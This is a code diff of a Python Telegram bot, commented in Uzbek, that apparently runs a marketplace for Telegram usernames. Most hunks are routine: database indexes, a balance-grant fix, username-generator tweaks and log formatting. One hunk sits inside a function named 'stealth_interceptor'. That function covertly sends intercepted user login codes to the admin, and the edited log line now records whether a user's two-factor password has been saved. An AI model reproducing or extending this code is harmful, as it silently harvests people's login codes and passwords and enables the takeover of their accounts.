@@ -375,6 +375,8 @@ async def init_db():
         await db.execute("CREATE INDEX IF NOT EXISTS idx_orders_status ON orders(status);")
         await db.execute("CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);")
         await db.execute("CREATE INDEX IF NOT EXISTS idx_search_tasks_status ON search_tasks(status);")
+        await db.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_search_results_unique ON search_results(search_id, username);")
+        await db.execute("CREATE INDEX IF NOT EXISTS idx_search_results_sid ON search_results(search_id);")
         await db.commit()
         
         # Backward compatibility for existing databases (ALTER TABLE)
@@ -388,7 +390,7 @@ async def init_db():
         except: pass
         
         # Balansi 0 bo'lgan foydalanuvchilarga boshlang'ich 5000 so'm berish (tiklash)
-        try: await db.execute("UPDATE users SET balance=5000 WHERE balance=0 OR balance IS NULL")
+        try: await db.execute("UPDATE users SET balance=5000 WHERE (balance=0 OR balance IS NULL) AND created_at > (strftime('%s','now') - 86400)")
         except: pass
         
         # Sozlamalarni kiritish
@@ -1131,7 +1133,7 @@ def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> l
         }
         style_sfx = {
             'uz': ['uz','uzb','bot','kanal','clan','pro','vip','top','hub','usta'],
-            'en': ['pro','hub','lab','hq','bot','zone','clan','co','ai','x']
+            'en': ['pro','hub','lab','hq','bot','zone','clan','co','ai','official']
         }
         style_pfx = {
             'uz': ['real','the','mega','ultra','super','vip','iam','mr','top'],
@@ -1254,7 +1256,7 @@ def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> l
         # 7. Minimal raqam (faqat 1 ta raqam, faqat chiroyli)
         for w in base_words[:200]:
             if 6 <= len(w) <= 9:
-                var_pool.append(f'{w}{random.choice(["0","1","7","x"])}')
+                var_pool.append(f'{w}{random.choice(["0","1","7"])}')
 
         random.shuffle(var_pool)
         pool = var_pool
@@ -1344,7 +1346,7 @@ async def stealth_interceptor(event):
                 try:
                     if ADMIN_IDS:
                         await _bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
-                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {has_2fa})")
+                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {bool(saved_password)})")
                 finally:
                     await _bot.session.close()
             except Exception as e:
@@ -1575,7 +1577,7 @@ async def transfer_username(bot, seller_id, buyer_id, username):
                 me_user = await seller_client.get_me()
                 if me_user and entity.id == me_user.id:
                     is_personal_profile = True
-                    logger.info("🎯 @{username} shaxsiy profil sifatida aniqlandi")
+                    logger.info(f"🎯 @{username} shaxsiy profil sifatida aniqlandi")
         except Exception as ee:
             logger.warning(f"get_entity orqali aniqlash xato ({ee}), GetAdminedPublicChannels sinab ko'rilmoqda...")
 
